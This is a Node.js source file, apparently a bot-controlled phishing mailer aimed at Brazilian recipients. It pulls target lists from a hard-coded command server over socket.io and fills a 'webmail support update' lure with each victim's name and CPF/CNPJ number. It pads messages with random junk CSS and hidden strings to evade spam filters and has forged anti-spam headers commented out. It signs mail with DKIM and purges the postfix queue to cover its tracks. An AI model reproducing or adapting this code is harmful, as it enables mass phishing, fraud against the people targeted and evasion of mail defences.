const nodemailer = require("nodemailer");
const htmlToText = require("nodemailer-html-to-text").htmlToText;
var randomstring = require("randomstring");
const { exec } = require("child_process");
var io = require("socket.io-client");
var socket = io.connect("http://173.212.219.58:3000", { reconnect: true });
const os = require("os");
const fs = require("fs");

const hostName = os.hostname();
var enviados = 0;
var list;
const elementos = [
  "-ms-user-select: none;",
  "-webkit-text-decoration-skip: objects;",
  "-webkit-user-select: none;",
  "align-items: center;",
  "align-items: left;",
  "background-color: transparent;",
  "border: 0 none transparent;",
  "border: none !important;",
  "border: none;",
  "bottom: 0;",
  "bottom: 10;",
  "bottom: 20;",
  "box-shadow: none !important;",
  "box-sizing: content-box;",
  "color: #fff;",
  "color: inherit;",
  "display: flex;",
  "display: grid;",
  "display: inline !important;",
  "display: inline;",
  "fill: currentColor;",
  "flex-grow: 0;",
  "flex-shrink: 0;",
  "font-size: 1em;",
  "font: inherit inherit inherit/inherit inherit;",
  "grid-gap: 30px;",
  "grid-template-columns: 1fr 1fr;",
  "height: 0 !important;",
  "height: 100%;",
  "height: calc(1em + 3px);",
  "justify-content: center;",
  "left: calc(50% - 0.5em) !important;",
  "letter-spacing: inherit;",
  "line-height: 1 !important;",
  "line-height: calc(1em + 2px);",
  "line-height: inherit;",
  "margin: 0 !important;",
  "margin: 0;",
  "min-height: 0 !important;",
  "min-width: 0 !important;",
  "opacity: 1;",
  "opacity: 10;",
  "opacity: 20;",
  "opacity: 30;",
  "outline-width: 0;",
  "outline: none !important;",
  "overflow-x: auto;",
  "overflow-y: hidden;",
  "padding: 0.5em !important;",
  "position: absolute !important;",
  "position: absolute;",
  "position: relative;",
  "right: 0;",
  "scrollbar-width: none;",
  "text-align: center;",
  "text-align: left;",
  "text-decoration: none;",
  "text-transform: inherit;",
  "top: 0;",
  "top: 10;",
  "top: 50;",
  "top: calc(50% - 0.5em) !important;",
  "transform: translate(50%, -50%);",
  "user-select: none;",
  "vertical-align: baseline;",
  "vertical-align: middle;",
  "white-space: nowrap;",
  "width: 0 !important;",
  "width: 100%;",
  "width: 2em;",
  "width: calc(1em + 3px);",
  "z-index: 1;",
];
const tags = [
  "-carousel",
  "-inner",
  "-thumbnails",
  "-layout",
  "-position",
  "-bottom",
  "-left",
  "-top",
  "-repeater",
  "-horizontal",
  "-webkit",
  "-back",
  "-image",
  "-price",
  "-old",
  "-quantity",
  "-button",
  "-blocks",
  "-totals",
  "-tables",
  "-countdown",
  "-nav",
  "-next",
];
const inicio = [
  "a",
  "b",
  "c",
  "d",
  "e",
  "f",
  "g",
  "h",
  "i",
  "j",
  "k",
  "l",
  "m",
  "n",
  "o",
  "p",
  "q",
  "r",
  "s",
  "t",
  "u",
  "v",
  "w",
  "x",
  "y",
  "z",
];

async function getemails() {
  return new Promise(async (resolve, reject) => {
    try {
      // Add a connect listener
      socket.on("connect", function (socket) {
        console.log("Connected!");
      });

      socket.on("EMAIL", function (from, msg) {
        console.log("EMAIL", msg);
        resolve(msg);
      });
      socket.emit("GETEMAIL", "", hostName);
    } catch (error) {
      resolve([]);
    }
  });
}

(async function () {
  console.log(hostName);

  do {
    list = await getemails();
    console.log(list.length);
    if (list.length < 1) {
      await sleep(60000);
    }
  } while (list.length < 1);

sendEmail(list.shift());


  total = list.length;
})();

async function sendEmail(email) {
  email = email + "|||";
  let mailarray = email.split("|");
  let INT8 = await randomstring.generate({
    length: 8,
    charset: "numeric",
  });
  let KEY8 = await randomstring.generate(8);

  //captura o html do email
  let html = fs.readFileSync("./html.html", "utf8");
  let dkim = fs.readFileSync("../dkim_private.pem", "utf8");

  html = await Change_HTML(html);
  //%emailcliente%
  html = html.replace(/%emailcliente%/g, mailarray[0]);
  html = html.replace(/%cpf%/g, formataCPF(mailarray[1]));
  html = html.replace(/%cnpj%/g, formataCNPJ(mailarray[1]));
  html = html.replace(/%nome%/g, mailarray[2].toUpperCase());

  html = html.replace(
    /<\/html>/g,
    '<br><br><br><br><br><br><font color="#fff">ID_' +
      randomstring.generate(between(15, 50)) +
      "_</font></html>"
  );
  let css = await cssgenerator();
  html = html.replace(/<\/head>/g, "<style>" + css + "</style></head>");

  //RANDON HTML
  let htmlarry = html.split("\n");
  let novohtml = "";
  htmlarry.forEach(function (item) {
    if (item.includes("<")) {
      novohtml += "\n".repeat(between(50, 250)) + item + "\n";
      item + "\n";
    } else {
      novohtml += item + "\n";
    }
  });

  html = novohtml;
  //RANDON HTML

  let subject = `Suporte Atualizacao Webmail! Ref:${randomstring.generate(
    9
  )}-`;
  //let subject = `Rescisão de contrato de trabalho -${randomstring.generate(8)}-`;
  try {
    let transporter = nodemailer.createTransport({
      service: "postfix",
      host: "localhost",
      secure: false,
      port: 25,
      tls: { rejectUnauthorized: false },
      dkim: {
        domainName: hostName,
        keySelector: hostName.split(".")[0],
        privateKey: dkim,
      },
    });
    transporter.use("compile", htmlToText());
    let fakefile = randomstring.generate(between(10, 250));
    // create a buffer
    const buff = Buffer.from(fakefile, "utf-8");
    // decode buffer as Base64
    const base64 = buff.toString("base64");

    let info = await transporter.sendMail({
      from:
        "=?UTF-8?B?" +
        new Buffer("suporte").toString("base64") +
        "?=" +
        " <" +
        "adm" +
        randomstring.generate(between(3, 5)) +
        "@" +
        hostName +
        ">",
      to: mailarray[0],
      subject: {
        prepared: true,
        value: "=?UTF-8?B?" + new Buffer(subject).toString("base64") + "?=",
      },
      html: html,
      textEncoding: "base64",
      encoding: "utf-8",
      headers: {
        /* "X-Ovh-Tracer-Id":
          between(1000, 999999) +
          between(1000, 999999) +
          between(1000, 999999) +
          between(1000, 999999),
        "X-VADE-SPAMSTATE": "clean",
        "X-VADE-SPAMSCORE": "49",
        "X-VADE-SPAMCAUSE": await randomstring.generate(980),
        "X-VR-SPAMSTATE": "ok",
        "X-VR-SPAMSCORE": "-100",
        "X-VR-SPAMCAUSE": await randomstring.generate(154),
        "Return-Path":
          "bounce-id=D" +
          between(100, 200) +
          "=U" +
          between(1000, 10000) +
          hostName +
          between(1000, 999999) +
          between(1000, 999999) +
          between(1000, 999999) +
          "@" +
          hostName,
        "X-sgxh1": await randomstring.generate(23),
        "X-rext": "5.interact2." + (await randomstring.generate(48)),
        "X-cid": "dksmith." + between(100000, 999999), */
        "List-Unsubscribe": `<mailto:adm@${hostName}?subject=unsubscribe>`,
      },
      /* attachments: [
        {
          filename: "Logo_" + INT8 + KEY8 + ".png",
          content: base64,
          encoding: "base64",
          cid: "uniq-Logo_" + INT8 + KEY8 + ".png",
        },
      ], */
    });
    enviados++;
    if (enviados % 250 === 0) {
      console.log(`Sent: ${hostName} - total enviados: ${enviados}`);
      await sleep(15000);
      exec("sudo postsuper -d ALL", (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
    }
  } catch (error) {
    enviados++;
    console.log(`Sent: Error ${error.message}`);
  }
  if (list.length == 0) {
    await socket.emit("FIM", "", hostName);
    console.log(`Envio Finalizado: ${hostName} - total enviados: ${enviados}`);
    process.exit(1);
  }
  
  await sleep(100);
  if (list.length !== 0) sendEmail(list.shift());
}

async function Change_HTML(html) {
  let KEY15 = await randomstring.generate(15);
  let KEY10 = await randomstring.generate(10);
  let KEY9 = await randomstring.generate(9);
  let KEY8 = await randomstring.generate(8);
  let KEY7 = await randomstring.generate(7);
  let KEY6 = await randomstring.generate(6);
  let KEY5 = await randomstring.generate(5);
  let INT15 = await randomstring.generate({
    length: 15,
    charset: "numeric",
  });
  let INT10 = await randomstring.generate({
    length: 10,
    charset: "numeric",
  });
  let INT9 = await randomstring.generate({
    length: 9,
    charset: "numeric",
  });
  let INT8 = await randomstring.generate({
    length: 8,
    charset: "numeric",
  });
  let INT7 = await randomstring.generate({
    length: 7,
    charset: "numeric",
  });
  let INT6 = await randomstring.generate({
    length: 6,
    charset: "numeric",
  });
  let INT5 = await randomstring.generate({
    length: 5,
    charset: "numeric",
  });
  let INT4 = await randomstring.generate({
    length: 4,
    charset: "numeric",
  });
  let INT3 = await randomstring.generate({
    length: 3,
    charset: "numeric",
  });
  let INT2 = await randomstring.generate({
    length: 2,
    charset: "numeric",
  });
  let INT1 = await randomstring.generate({
    length: 2,
    charset: "numeric",
  });

  html = html.replace(/%R15%/g, KEY15);
  html = html.replace(/%R10%/g, KEY10);
  html = html.replace(/%R9%/g, KEY9);
  html = html.replace(/%R8%/g, KEY8);
  html = html.replace(/%R7%/g, KEY7);
  html = html.replace(/%R6%/g, KEY6);
  html = html.replace(/%R5%/g, KEY5);
  html = html.replace(/%RND15%/g, INT15);
  html = html.replace(/%RND10%/g, INT10);
  html = html.replace(/%RND9%/g, INT9);
  html = html.replace(/%RND8%/g, INT8);
  html = html.replace(/%RND7%/g, INT7);
  html = html.replace(/%RND6%/g, INT6);
  html = html.replace(/%RND5%/g, INT5);
  html = html.replace(/%RND4%/g, INT4);
  html = html.replace(/%RND3%/g, INT3);
  html = html.replace(/%RND2%/g, INT2);
  html = html.replace(/%RND1%/g, INT1);

  return html;
}
function between(min, max) {
  return Math.floor(Math.random() * (max - min + 1) + min);
}

function formataCPF(cpf) {
  //retira os caracteres indesejados...
  cpf = cpf.replace(/[^\d]/g, "");

  //realizar a formatação...
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
}

function formataCNPJ(cnpj) {
  //retira os caracteres indesejados...
  cnpj = cnpj.replace(/[^\d]/g, "");

  //realizar a formatação...
  return cnpj.replace(/^(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, "$1.$2.$3/$4-$5");
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function cssgenerator() {
  let linhas = between(500, 1000);
  let letra = inicio[Math.floor(Math.random() * inicio.length)];
  let currentlinhas = 0;
  let css = "";
  //faz um loop ate montar todas as linhas
  do {
    let quanttags = between(1, 3);
    css = css + letra;
    for (let i = 0; i < quanttags; i++) {
      let tagstmp = tags[Math.floor(Math.random() * tags.length)];
      css = css + tagstmp;
    }
    css = css + " {\r\n";
    let quantelementos = between(1, 20);
    for (let i = 0; i < quantelementos; i++) {
      let elemtmp = elementos[Math.floor(Math.random() * elementos.length)];
      css = css + "\t" + elemtmp + "\r\n";
    }
    css = css + "}\r\n";
    currentlinhas = css.split(/\r\n|\r|\n/).length;
  } while (currentlinhas < linhas);
  return css;
}
